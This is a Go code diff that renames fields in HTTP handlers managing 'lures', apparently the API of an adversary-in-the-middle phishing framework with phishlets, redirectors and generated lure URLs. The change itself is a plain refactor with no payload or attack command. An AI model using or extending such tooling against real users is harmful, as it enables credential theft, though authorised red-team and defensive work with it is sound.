@@ -16,7 +16,7 @@ func (r *Router) listLures(w http.ResponseWriter, req *http.Request) {
 	limit, offset := parsePagination(req)
 	phishlet := req.URL.Query().Get("phishlet")
 
-	all, err := r.lures.List()
+	all, err := r.Lures.List()
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to list lures")
 		return
@@ -70,7 +70,7 @@ func (r *Router) createLure(w http.ResponseWriter, req *http.Request) {
 		OGURL:       body.OGURL,
 		Redirector:  body.Redirector,
 	}
-	if err := r.lures.Create(lure); err != nil {
+	if err := r.Lures.Create(lure); err != nil {
 		if errors.Is(err, aitm.ErrConflict) {
 			writeError(w, http.StatusConflict, "lure already exists")
 		} else {
@@ -83,7 +83,7 @@ func (r *Router) createLure(w http.ResponseWriter, req *http.Request) {
 
 func (r *Router) updateLure(w http.ResponseWriter, req *http.Request) {
 	id := req.PathValue("id")
-	lure, err := r.lures.Get(id)
+	lure, err := r.Lures.Get(id)
 	if err != nil {
 		if errors.Is(err, aitm.ErrNotFound) {
 			writeError(w, http.StatusNotFound, "lure does not exist")
@@ -122,7 +122,7 @@ func (r *Router) updateLure(w http.ResponseWriter, req *http.Request) {
 		lure.Redirector = *body.Redirector
 	}
 
-	if err := r.lures.Update(lure); err != nil {
+	if err := r.Lures.Update(lure); err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to update lure")
 		return
 	}
@@ -131,7 +131,7 @@ func (r *Router) updateLure(w http.ResponseWriter, req *http.Request) {
 
 func (r *Router) deleteLure(w http.ResponseWriter, req *http.Request) {
 	id := req.PathValue("id")
-	if err := r.lures.Delete(id); err != nil {
+	if err := r.Lures.Delete(id); err != nil {
 		if errors.Is(err, aitm.ErrNotFound) {
 			writeError(w, http.StatusNotFound, "lure does not exist")
 		} else {
@@ -144,7 +144,7 @@ func (r *Router) deleteLure(w http.ResponseWriter, req *http.Request) {
 
 func (r *Router) generateLureURL(w http.ResponseWriter, req *http.Request) {
 	id := req.PathValue("id")
-	lure, err := r.lures.Get(id)
+	lure, err := r.Lures.Get(id)
 	if err != nil {
 		if errors.Is(err, aitm.ErrNotFound) {
 			writeError(w, http.StatusNotFound, "lure does not exist")
@@ -158,7 +158,7 @@ func (r *Router) generateLureURL(w http.ResponseWriter, req *http.Request) {
 	// Body is optional; ignore decode errors.
 	json.NewDecoder(req.Body).Decode(&body)
 
-	url, err := lure.GenerateURL(r.domain, body.Params)
+	url, err := lure.GenerateURL(r.Domain, body.Params)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to generate lure URL")
 		return
@@ -175,7 +175,7 @@ func (r *Router) pauseLure(w http.ResponseWriter, req *http.Request) {
 	}
 	d, _ := time.ParseDuration(body.Duration)
 
-	if err := r.lures.Pause(id, d); err != nil {
+	if err := r.Lures.Pause(id, d); err != nil {
 		if errors.Is(err, aitm.ErrNotFound) {
 			writeError(w, http.StatusNotFound, "lure does not exist")
 		} else {
@@ -183,7 +183,7 @@ func (r *Router) pauseLure(w http.ResponseWriter, req *http.Request) {
 		}
 		return
 	}
-	lure, err := r.lures.Get(id)
+	lure, err := r.Lures.Get(id)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to get lure")
 		return
@@ -193,7 +193,7 @@ func (r *Router) pauseLure(w http.ResponseWriter, req *http.Request) {
 
 func (r *Router) unpauseLure(w http.ResponseWriter, req *http.Request) {
 	id := req.PathValue("id")
-	if err := r.lures.Unpause(id); err != nil {
+	if err := r.Lures.Unpause(id); err != nil {
 		if errors.Is(err, aitm.ErrNotFound) {
 			writeError(w, http.StatusNotFound, "lure does not exist")
 		} else {
@@ -201,7 +201,7 @@ func (r *Router) unpauseLure(w http.ResponseWriter, req *http.Request) {
 		}
 		return
 	}
-	lure, err := r.lures.Get(id)
+	lure, err := r.Lures.Get(id)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to get lure")
 		return
